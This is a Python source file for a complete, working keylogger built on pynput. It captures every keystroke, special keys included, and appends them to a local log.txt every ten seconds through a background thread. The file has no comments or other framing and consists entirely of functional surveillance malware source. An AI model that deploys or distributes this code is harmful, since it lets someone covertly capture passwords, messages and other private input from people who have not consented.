import pynput.keyboard
import threading
import time

class SimpleKeylogger:
    def __init__(self):
        self.log = ""
        self.lock = threading.Lock()
        
    def append_to_log(self, key_strike):
        with self.lock:
            self.log += key_strike
    
    def write_log_to_file(self):
        with self.lock:
            with open("log.txt", "a+", encoding="utf-8") as file:
                file.write(self.log)
            self.log = ""
    
    def evaluate_keys(self, key):
        try:
            pressed_key = str(key.char)
        except AttributeError:
            special_keys = {
                pynput.keyboard.Key.space: " ",
                pynput.keyboard.Key.enter: "\n",
                pynput.keyboard.Key.tab: "\t",
                pynput.keyboard.Key.backspace: " [BACKSPACE] ",
                pynput.keyboard.Key.delete: " [DELETE] ",
                pynput.keyboard.Key.shift: " [SHIFT] ",
                pynput.keyboard.Key.ctrl_l: " [CTRL_L] ",
                pynput.keyboard.Key.ctrl_r: " [CTRL_R] ",
                pynput.keyboard.Key.alt_l: " [ALT_L] ",
                pynput.keyboard.Key.alt_r: " [ALT_R] ",
                pynput.keyboard.Key.esc: " [ESC] ",
                pynput.keyboard.Key.caps_lock: " [CAPS_LOCK] ",
                pynput.keyboard.Key.cmd: " [CMD] ",
                pynput.keyboard.Key.f1: " [F1] ",
                pynput.keyboard.Key.f2: " [F2] ",
                pynput.keyboard.Key.f3: " [F3] ",
                pynput.keyboard.Key.f4: " [F4] ",
                pynput.keyboard.Key.f5: " [F5] ",
                pynput.keyboard.Key.f6: " [F6] ",
                pynput.keyboard.Key.f7: " [F7] ",
                pynput.keyboard.Key.f8: " [F8] ",
                pynput.keyboard.Key.f9: " [F9] ",
                pynput.keyboard.Key.f10: " [F10] ",
                pynput.keyboard.Key.f11: " [F11] ",
                pynput.keyboard.Key.f12: " [F12] "
            }
            pressed_key = special_keys.get(key, f" [{str(key)}] ")
        
        self.append_to_log(pressed_key)
    
    def start(self):
        def on_press(key):
            self.evaluate_keys(key)
        
        def log_writer():
            while True:
                self.write_log_to_file()
                time.sleep(10)  # Write to log file every 10 seconds
        
        keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
        with keyboard_listener:
            log_writer_thread = threading.Thread(target=log_writer, daemon=True)
            log_writer_thread.start()
            keyboard_listener.join()

if __name__ == "__main__":
    SimpleKeylogger().start()
